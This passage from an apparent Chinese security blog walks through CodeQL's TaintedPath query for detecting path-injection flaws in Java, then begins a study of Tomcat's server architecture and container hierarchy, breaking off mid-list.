class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span>ClassInstanceExpr ma <span class="token operator">|</span>        source<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">and</span> ma<span class="token punctuation">.</span>getTypeName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"X1"</span>        <span class="token operator">and</span> ma<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"Caller"</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="path-injection"><a href="#path-injection" class="headerlink" title="path-injection"></a>path-injection</h2><p>CEW-022</p><p>用于检测文件相关，可以是文件上传、文件读取。主要判断逻辑是对与传入文件操作时文件名是否可控</p><p><code>java\ql\src\Security\CWE\CWE-022\TaintedPath.ql:</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/** * @name Uncontrolled data used in path expression * @description Accessing paths influenced by users can allow an attacker to access unexpected resources. * @kind path-problem * @problem.severity error * @security-severity 7.5 * @precision high * @id java/path-injection * @tags security *       external/cwe/cwe-022 *       external/cwe/cwe-023 *       external/cwe/cwe-036 *       external/cwe/cwe-073 */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>PathCreation<span class="token keyword">import</span> DataFlow::PathGraph<span class="token keyword">import</span> TaintedPathCommonclass ContainsDotDotSanitizer extends DataFlow::BarrierGuard {  ContainsDotDotSanitizer<span class="token punctuation">(</span><span class="token punctuation">)</span> {    this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"contains"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>StringLiteral<span class="token punctuation">)</span><span class="token punctuation">.</span>getValue<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">".."</span>  }  override predicate checks<span class="token punctuation">(</span>Expr e<span class="token punctuation">,</span> <span class="token keyword">boolean</span> branch<span class="token punctuation">)</span> {    e <span class="token operator">=</span> this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> branch <span class="token operator">=</span> <span class="token boolean">false</span>  }}class TaintedPathConfig extends TaintTracking::Configuration {  TaintedPathConfig<span class="token punctuation">(</span><span class="token punctuation">)</span> { this <span class="token operator">=</span> <span class="token string">"TaintedPathConfig"</span> }  override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> { source instanceof RemoteFlowSource }  override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span>Expr e <span class="token operator">|</span> e <span class="token operator">=</span> sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> e <span class="token operator">=</span> <span class="token keyword">any</span><span class="token punctuation">(</span>PathCreation p<span class="token punctuation">)</span><span class="token punctuation">.</span>getAnInput<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token operator">not</span> guarded<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>  }<span class="token comment">//</span>  override predicate isSanitizer<span class="token punctuation">(</span>DataFlow::Node node<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">Type</span> t <span class="token operator">|</span> t <span class="token operator">=</span> node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> t instanceof BoxedType <span class="token operator">or</span> t instanceof PrimitiveType<span class="token punctuation">)</span>  }  override predicate isSanitizerGuard<span class="token punctuation">(</span>DataFlow::BarrierGuard guard<span class="token punctuation">)</span> {    guard instanceof ContainsDotDotSanitizer  }}<span class="token keyword">from</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink<span class="token punctuation">,</span> PathCreation p<span class="token punctuation">,</span> TaintedPathConfig conf<span class="token keyword">where</span>  sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>getAnInput<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>  conf<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span><span class="token keyword">select</span> p<span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"$@ flows to here and is used in a path."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token string">"User-provided value"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将关注点放在<code>class TaintedPathConfig</code>上：</p><h3 id="isSource-1"><a href="#isSource-1" class="headerlink" title="isSource"></a>isSource</h3><p>这里对isSource进行了重写，指向RemoteFlowSource，其中定义了用户输入可控的常见源。</p><h3 id="isSink"><a href="#isSink" class="headerlink" title="isSink"></a>isSink</h3><p>语句：<code>exists(Expr e | e = sink.asExpr() | e = any(PathCreation p).getAnInput() and not guarded(e))</code></p><p>这里实例化了<code>PathCreation</code> 类，使用了谓词<code>guarded</code>，我们逐一进行分析：</p><h4 id="PathCreation"><a href="#PathCreation" class="headerlink" title="PathCreation"></a><code>PathCreation</code></h4><p>定义在<code>java\ql\lib\semmle\code\java\security\PathCreation.qll</code>中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">abstract class PathCreation extends Expr {    abstract Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  }    class PathsGet extends PathCreation<span class="token punctuation">,</span> MethodAccess {    <span class="token comment">// 寻找`java.nio.file.Paths`类下的get方法</span>    PathsGet<span class="token punctuation">(</span><span class="token punctuation">)</span> {      <span class="token keyword">exists</span><span class="token punctuation">(</span>Method m <span class="token operator">|</span> m <span class="token operator">=</span> this<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>        m<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypePaths <span class="token operator">and</span>        m<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"get"</span>      <span class="token punctuation">)</span>    }    <span class="token comment">// 返回这个方法的集合</span>    override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> }  }    class FileSystemGetPath extends PathCreation<span class="token punctuation">,</span> MethodAccess {    <span class="token comment">// 寻找`java.nio.file.FileSystem`类下的getPath方法并通过getInput方法返回这个集合</span>    FileSystemGetPath<span class="token punctuation">(</span><span class="token punctuation">)</span> {      <span class="token keyword">exists</span><span class="token punctuation">(</span>Method m <span class="token operator">|</span> m <span class="token operator">=</span> this<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>        m<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeFileSystem <span class="token operator">and</span>        m<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"getPath"</span>      <span class="token punctuation">)</span>    }      override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> }  }    class FileCreation extends PathCreation<span class="token punctuation">,</span> ClassInstanceExpr {    <span class="token comment">//   限定实例化的对象的原型在`java.io.File`类下</span>    <span class="token comment">// 例如new xxx()  这个xxx必须在`java.io.File`下</span>    FileCreation<span class="token punctuation">(</span><span class="token punctuation">)</span> { this<span class="token punctuation">.</span>getConstructedType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeFile }      override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> {        <span class="token comment">// 获得上述实例化的class的参数，并且这个参数的类型必须是file类型的，并返回满足and条件的参数集合</span>      result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>      <span class="token comment">// Relevant arguments include those that are not a `File`.</span>      <span class="token operator">not</span> result<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeFile    }  }    class FileWriterCreation extends PathCreation<span class="token punctuation">,</span> ClassInstanceExpr {    <span class="token comment">//   限定在`java.io.FileWriter`类下</span>    FileWriterCreation<span class="token punctuation">(</span><span class="token punctuation">)</span> { this<span class="token punctuation">.</span>getConstructedType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"java.io.FileWriter"</span> }    <span class="token comment">// 返回参数类型是String类型的参数</span>    override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> {      result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>      <span class="token comment">// Relevant arguments are those of type `String`.</span>      result<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeString    }  }    predicate inWeakCheck<span class="token punctuation">(</span>Expr e<span class="token punctuation">)</span> {    <span class="token comment">// None of these are sufficient to guarantee that a string is safe.</span>    <span class="token comment">// 约束一个类下的方法如果是startswith等方法，注意这里的方法是原生的，这里建议扩大覆盖范围，使用matches去匹配类似的方法名</span>    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess m<span class="token punctuation">,</span> Method def <span class="token operator">|</span> m<span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> e <span class="token operator">and</span> m<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> def <span class="token operator">|</span>      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"startsWith"</span> <span class="token operator">or</span>      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"endsWith"</span> <span class="token operator">or</span>      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"isEmpty"</span> <span class="token operator">or</span>      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"equals"</span>    <span class="token punctuation">)</span>    <span class="token operator">or</span>    <span class="token comment">// Checking against `null` has no bearing on path traversal.</span>    <span class="token keyword">exists</span><span class="token punctuation">(</span>EqualityTest b <span class="token operator">|</span> b<span class="token punctuation">.</span>getAnOperand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> e <span class="token operator">|</span> b<span class="token punctuation">.</span>getAnOperand<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof NullLiteral<span class="token punctuation">)</span>  }    <span class="token comment">// Ignore cases where the variable has been checked somehow,</span>  <span class="token comment">// but allow some particularly obviously bad cases.</span>  predicate guarded<span class="token punctuation">(</span>VarAccess e<span class="token punctuation">)</span> {    <span class="token comment">//   一个参数必须存在于上面抽象类返回结果的集合中且条件分支为True的情况下的方法，还要不是StartsWith等方法</span>    <span class="token keyword">exists</span><span class="token punctuation">(</span>PathCreation p <span class="token operator">|</span> e <span class="token operator">=</span> p<span class="token punctuation">.</span>getInput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">and</span>    <span class="token keyword">exists</span><span class="token punctuation">(</span>ConditionBlock cb<span class="token punctuation">,</span> Expr c <span class="token operator">|</span>      cb<span class="token punctuation">.</span>getCondition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAChildExpr<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> c <span class="token operator">and</span>      c <span class="token operator">=</span> e<span class="token punctuation">.</span>getVariable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAnAccess<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>      cb<span class="token punctuation">.</span>controls<span class="token punctuation">(</span>e<span class="token punctuation">.</span>getBasicBlock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">and</span>      <span class="token comment">// Disallow a few obviously bad checks.</span>      <span class="token operator">not</span> inWeakCheck<span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token punctuation">)</span>  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取用于创建路径的输入，定义了常见用法。使用方式通过调用<code>getAnInput()</code>谓词获取方法内的所有参数，也就是将<code>sink</code>定义为传入的文件名。</p><h4 id="guarded"><a href="#guarded" class="headerlink" title="guarded"></a><code>guarded</code></h4><p>定义在<code>java\ql\src\Security\CWE\CWE-022\TaintedPathCommon.qll</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">predicate guarded<span class="token punctuation">(</span>VarAccess e<span class="token punctuation">)</span> {  <span class="token keyword">exists</span><span class="token punctuation">(</span>PathCreation p <span class="token operator">|</span> e <span class="token operator">=</span> p<span class="token punctuation">.</span>getAnInput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//强调变量调用为文件名 and</span>  <span class="token keyword">exists</span><span class="token punctuation">(</span>ConditionBlock cb<span class="token punctuation">,</span> Expr c <span class="token operator">|</span>    cb<span class="token punctuation">.</span>getCondition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAChildExpr<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> c <span class="token comment">//将代码块的子表达式与c表达式进行匹配 and</span>    c <span class="token operator">=</span> e<span class="token punctuation">.</span>getVariable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAnAccess<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//文件名的所有调用和表达式c匹配 and</span>    cb<span class="token punctuation">.</span>controls<span class="token punctuation">(</span>e<span class="token punctuation">.</span>getBasicBlock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment">//如果传入的e.getBasicBlock()是由该条件控制的基本块，即条件为true的基本块，则保持成立。 </span>    <span class="token operator">and</span>    <span class="token operator">not</span> inWeakCheck<span class="token punctuation">(</span>c<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>cb</code>是<code>ConditionBlock</code>实例化而来。</p><blockquote><ul><li>cb：获取的是整个块，方法开始<code>{}</code>整个内容</li><li>cb.getCondition()：表示获取此基本块最后一个节点条件</li><li>cb.getCondition().getAChildExpr()：表示获取子表达式</li></ul></blockquote><h3 id="isSanitizer"><a href="#isSanitizer" class="headerlink" title="isSanitizer"></a>isSanitizer</h3><p>如果数据类型是基本类型或者是其包装类则清洗掉</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isSanitizer<span class="token punctuation">(</span>DataFlow::Node node<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">Type</span> t <span class="token operator">|</span> t <span class="token operator">=</span> node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> t instanceof BoxedType <span class="token operator">or</span> t instanceof PrimitiveType<span class="token punctuation">)</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="isSanitizerGuard"><a href="#isSanitizerGuard" class="headerlink" title="isSanitizerGuard"></a>isSanitizerGuard</h3><p>这里也是起到清洗作用，当调用方法为<code>contains</code>并且其参数值为<code>..</code>，对表达式<code>e</code>的判断为<code>false</code>则条件成立。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class ContainsDotDotSanitizer extends DataFlow::BarrierGuard {    ContainsDotDotSanitizer<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"contains"</span><span class="token punctuation">)</span> <span class="token operator">and</span>        this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>StringLiteral<span class="token punctuation">)</span><span class="token punctuation">.</span>getValue<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">".."</span>}    override predicate checks<span class="token punctuation">(</span>Expr e<span class="token punctuation">,</span> <span class="token keyword">boolean</span> branch<span class="token punctuation">)</span> {        e <span class="token operator">=</span> this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> branch <span class="token operator">=</span> <span class="token boolean">false</span>    }}override predicate isSanitizerGuard<span class="token punctuation">(</span>DataFlow::BarrierGuard guard<span class="token punctuation">)</span> {    guard instanceof ContainsDotDotSanitizer}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/T7knl1sigIOXW54.png" alt="image-20220704155648557"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> codeql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomcat源码学习</title>
      <link href="/2022/05/19/tomcat-source/"/>
      <url>/2022/05/19/tomcat-source/</url>
      
        <content type="html"><![CDATA[<h1 id="tomcat源码学习"><a href="#tomcat源码学习" class="headerlink" title="tomcat源码学习"></a>tomcat源码学习</h1><p>看到一篇文章深度剖析tomcat源码，以后可能要做相关的安全研究，就跟源码学习一下。链接放在文章最后了。当然，我看源码的角度是从安全研究出发，可能和Java开发大佬的思路不太相同qwq。</p><h2 id="tomcat架构设计"><a href="#tomcat架构设计" class="headerlink" title="tomcat架构设计"></a>tomcat架构设计</h2><h3 id="tomcat功能分析"><a href="#tomcat功能分析" class="headerlink" title="tomcat功能分析"></a>tomcat功能分析</h3><p>我们平常管tomcat叫中间件，主要目的是实现web请求的处理，实现客户端和服务端的通信。</p><h4 id="HTTP服务器"><a href="#HTTP服务器" class="headerlink" title="HTTP服务器"></a>HTTP服务器</h4><p>一般来说，最广泛的应用通信就是实现HTTP协议，实现web服务。我们希望tomcat能够接受并且处理http请求，作为http服务器，进行数据传送通信。</p><p>我们来回忆一下计算机学院必教的《计算机通信原理》，看看一个完整的http通信过程是什么样的：</p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-fdedde65a4c4f21f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/900/format/webp" alt="img"></p><p>http协议是应用层协议，基于TCP。图中步骤总共有十一步：</p><ol><li>用户通过浏览器发起请求</li><li>浏览器向服务器发起TCP连接请求</li><li>经典TCP三次握手建立连接</li><li>浏览器将请求的数据打包成一个HTTP协议格式的数据包</li><li>数据包传输到服务端</li><li>服务端解包分析</li><li>服务端解析完，处理请求</li><li>服务端将处理完的结果使用HTTP协议打包</li><li>服务端发送包含处理结果的HTTP数据包</li><li>浏览器拿到HTTP数据包，解包</li><li>浏览器将解析后的数据呈现给用户</li></ol><p>所以为了实现以上十一条，tomcat作为一个HTTP服务器，只要功能就是就是</p><ul><li>建立连接</li><li>解析请求数据</li><li>处理请求</li><li>发送响应数据</li></ul><p>关于处理请求的部分：</p><p>当我们使用浏览器向网站发起HTTP请求，服务端收到这个请求后，会调用具体的程序（Java类）进行处理。不同的请求需要由不同的Java类进行处理，我们需要让HTTP服务器知道针对不同的请求使用哪个Java类中的哪个方法。</p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-38041e018a1353bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790/format/webp" alt="img"></p><h4 id="servlet容器"><a href="#servlet容器" class="headerlink" title="servlet容器"></a>servlet容器</h4><p>面向接口编程：我们可以定义一个servlet接口，所有的业务类都实现这个接口。我们还需要解决servlet定位问题，当HTTP请求到来时，tomcat如何知道该由哪个servlet进行处理。于是出现了servlet容器。Servlet 容器作为 HTTP 服务器和具体业务类进行交互的桥梁，HTTP 服务器将请求交由 Servlet 容器去处理，而 Servlet 容器则负责将请求转发到具体的 Servlet，并且调用 Servlet 的方法进行业务处理，它们之间的调用通过 Servlet 接口进行解耦。</p><p>servlet接口和容器是由<strong>JavaEE</strong>进行定义，tomcat只是对其进行了实现。</p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-dd341e18e2b12da9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/900/format/webp" alt="img"></p><h4 id="Tomcat-Servlet-容器工作流程"><a href="#Tomcat-Servlet-容器工作流程" class="headerlink" title="Tomcat Servlet 容器工作流程"></a>Tomcat Servlet 容器工作流程</h4><ol><li>HTTP服务器把请求信息使用<code>ServletRequest</code>对象封装起来</li><li>进一步调用<code>Servlet </code>容器中具体的<code>Servlet</code></li><li>根据URL和<code>Servlet</code>的映射关系，找到相应的<code>Servlet</code></li><li>如果<code>Servlet</code>还没有被加载，就使用反射机制创建此<code>Servlet</code>并调用其init方法初始化</li><li>接着调用具体<code>Servlet</code>的<code>service</code>方法来处理请求，请求结果使用<code>ServletResponse </code>对象封装</li><li>把<code>ServletResponse </code>对象返回给HTTP服务器，HTTP服务器把相应发送回客户端</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/14795543-5dee69caa514ab6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/900/format/webp" alt="img"></p><h4 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h4><p>根据上述分析，我们知道了 Tomcat 要实现成 “HTTP 服务器 + Servlet 容器”，也就是所谓的 Web 服务器。<br> 而作为一个 Web 服务器，Tomcat 要实现两个非常核心的功能：</p><ul><li><strong>Http 服务器功能：</strong>进行 Socket 通信(基于 TCP/IP)，解析 HTTP 报文</li><li><strong>Servlet 容器功能：</strong>加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/14795543-40b9f6d89f132142.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/900/format/webp" alt="img"></p><h3 id="tomcat组件设计"><a href="#tomcat组件设计" class="headerlink" title="tomcat组件设计"></a>tomcat组件设计</h3><h4 id="连接器和容器"><a href="#连接器和容器" class="headerlink" title="连接器和容器"></a>连接器和容器</h4><ul><li>连接器（Connector）负责对外交流，完成HTTP服务器的功能</li><li>容器（Container）负责内部处理，完成servlet功能</li></ul><p>因为连接器主要是对外交流，我们研究的是tomcat本身处理请求的过程，所以只对容器进行研究说明：</p><h4 id="容器的设计"><a href="#容器的设计" class="headerlink" title="容器的设计"></a>容器的设计</h4><p>容器部分设计了4种容器，分别是Engine、Host、Context、Wrapper。这四种容器是父子关系，整体形成一个分层结构，如下图所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-1cb57ccc26c2a730.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/903/format/webp" alt="img"></p><ul><li>Engine 表示整个Catalina的Servlet引擎，用来管理多个虚拟站点。一个Service最多只能有一个Engine，但一个Engine可以包含多个Host</li><li>Host 代表一个虚拟主机或者一个站点，可以给Tomcat配置多个虚拟主机地址，一个虚拟主机下可以包含多个Context</li><li>Context 表示一个web应用程序，可包含多个Wrapper</li><li>Wrapper 表示一个Servlet，负责整个Servlet的生命周期。</li></ul><blockquote><p>Catalina 也是 Tomcat 中的一个组件，它负责的是解析 Tomcat 的配置文件（server.xml），以此来创建服务器 Server 组件并进行管理。</p><p>因此也可以认为整个 Tomcat 就是一个 Catalina 实例，Tomcat 启动的时候会初始化这个实例，Catalina 实例通过加载server.xml 完成其他实例的创建，创建并管理一个 Server，Server 创建并管理多个服务， 每个服务又可以有多个Connector 和一个 Container。</p></blockquote><h3 id="tomcat架构汇总"><a href="#tomcat架构汇总" class="headerlink" title="tomcat架构汇总"></a>tomcat架构汇总</h3><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>其实这些组件的设计更多是为了使用者能够灵活的进行 web 项目部署配置，因此我们将其抽取成一个配置文件，名为 server.xml，如下图所示，在配置文件中你也能很清晰的对应上这些层级关系。</p><h4 id="tomcat模块分层结构"><a href="#tomcat模块分层结构" class="headerlink" title="tomcat模块分层结构"></a>tomcat模块分层结构</h4><p>Tomcat 是一个由一系列可配置的组件构成的 Web 容器，在实现时根据不同的功能 Tomcat 内部进行了模块分层，其中 Catalina 模块作为 Tomcat 的 servlet 容器实现，它是 Tomcat 的核心模块。因为从另一个角度来说，Tomcat 本质上就是一款 Servlet 容器。而其他模块的设计都是为 Catalina 提供支撑的。<br> 相关模块的功能说明如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-1378072b18fb2401.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/900/format/webp" alt="img"></p><p>整体模块分层结构图如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-b40e4e8a76f8f7ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/821/format/webp" alt="img"></p><h4 id="总体架构"><a href="#总体架构" class="headerlink" title="总体架构"></a>总体架构</h4><p><img src="https://upload-images.jianshu.io/upload_images/14795543-17012318407368f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/900/format/webp" alt="img"></p><ul><li>Listener 可以在Tomcat生命周期中完成某些容器相关的监听器（研究内存马时会再次提到）</li><li>JNDI JNDI是 Java 命名与目录接口，是属于 J2EE 规范的，Tomcat 对其进行了实现。JNDI 在 J2EE 中的角色就是“交换机”，即 J2EE 组件在运行时间接地查找其他组件、资源或服务的通用机制（你可以简单理解为给资源取个名字，再根据名字来找资源）</li><li>Cluster组件 提供了集群功能，可以将对应容器需要共享的数据同步到集群中的其他Tomcat实例中</li><li>Realm组件 提供了容器级别的用户-密码-权限数据对象</li><li>Loader组件 web应用加载器，用于加载Web应用的资源，保证不同Web应用之间的资源隔离</li><li>Manager租价 